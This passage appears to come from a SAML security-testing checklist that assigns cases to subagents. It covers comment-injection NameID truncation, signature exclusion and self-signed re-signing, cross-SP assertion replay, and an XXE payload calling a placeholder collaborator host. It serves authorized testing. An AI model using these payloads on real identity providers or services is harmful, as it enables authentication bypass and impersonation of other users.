Duo Labs 2018: canonicalisation ignores comments, but some text extractors return only the first text node. Register IdP user `B@example.test<!---->.attacker.test` → signed NameID text `B@example.test<!---->.attacker.test`; vulnerable SP reads `B@example.test`.

```text
IdP account email:  victim-B@example.test.yourdomain.test   (owned by you)
Edit in SAML Raider before re-signing is NOT the test; the IdP must sign the comment-bearing value.
Where the IdP lets you set the NameID/email: victim-B@example.test<!---->.yourdomain.test
```

- **Fail:** SP logs you in as the truncated identity.
- **Refs:** https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations · CVE-2017-11427 / 11428 / 11429 / 11430 · `CS-SAML`

### OA-45 · SAML signature exclusion and certificate trust — `CRITICAL`
Tags: `saml` `signature-exclusion` `self-signed` · Subagent: OA-E

SAML Raider: (1) remove all signatures; (2) remove only the Assertion signature when the Response is signed (and vice versa); (3) re-sign with a self-signed cert (SAML Raider "Send certificate to SAML Raider Certificates → Save and self-sign"); (4) use an `<X509Certificate>` embedded in the message instead of the pinned IdP cert.

- **Fail:** unsigned or self-signed assertion accepted.
- **Refs:** `CS-SAML` (Validate signatures; trusted certificates) · https://github.com/CompassSecurity/SAMLRaider

### OA-46 · SAML Audience / Recipient / Destination / InResponseTo validation — `HIGH`
Tags: `saml` `audience` `cross-sp` · Subagent: OA-E

Take a valid assertion issued for **another SP** on the same IdP (another app you can log into) and post it to the target ACS. Also tamper with `Destination`, `Recipient`, `NotBefore`/`NotOnOrAfter` (only possible with a signature bypass), and `InResponseTo`.

- **Fail:** cross-SP assertion accepted; expired conditions accepted.
- **Refs:** SAML 2.0 Core §2.5.1 (Conditions), Profiles §4.1.4.3 · `CS-SAML`

### OA-47 · XXE in SAML message / metadata processing — `HIGH`
Tags: `saml` `xxe` · Subagent: OA-E

Prepend a DOCTYPE with an external entity pointing at `https://$COLLAB/xxe` to the decoded `SAMLResponse` (unsigned is fine — parsing happens before signature checks). Out-of-band detection only; no local file reads.

```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "https://COLLAB/xxe"> %x;]><samlp:Response ...>
```

- **Fail:** SP fetches the entity. Hand off to the XXE skill for impact assessment.
- **Refs:** https://portswigger.net/web-security/xxe · https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
